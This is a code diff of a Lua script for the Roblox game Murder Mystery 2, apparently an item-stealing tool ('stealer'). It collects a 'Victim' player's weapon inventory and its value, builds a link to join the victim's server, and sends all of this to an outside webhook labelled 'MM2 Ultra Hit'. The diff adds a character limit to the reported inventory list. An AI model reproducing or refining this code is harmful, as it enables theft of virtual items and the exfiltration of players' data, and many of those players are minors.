@@ -188,7 +188,7 @@ for _, w in ipairs(weaponsToSend) do
     totalValue += w.TotalValue
 end
 
--- Webhook con valor de cada arma
+-- Webhook con valor de cada arma y límite de caracteres
 local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
 local fields = {
     {name="Victim", value=LocalPlayer.Name, inline=true},
@@ -196,9 +196,14 @@ local fields = {
     {name="Inventario", value="", inline=false},
     {name="Total value", value=tostring(totalValue), inline=true}
 }
-for _, w in ipairs(weaponsToSend) do
+for i, w in ipairs(weaponsToSend) do
     fields[3].value = fields[3].value..string.format("%s x%s (%s) | Value: %s\n", w.DataID, w.Amount, w.Rarity, w.TotalValue)
+    if #fields[3].value > 1024 then
+        fields[3].value = fields[3].value.."\nMas armas en el inventario 😎💲"
+        break
+    end
 end
+
 local prefix = _G.pingEveryone=="Yes" and "@everyone " or ""
 local thumbnailURL = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
 SendWebhook("💪MM2 Ultra Hit💯","💰Armas seleccionadas Godly/Ancient",fields,prefix,thumbnailURL)
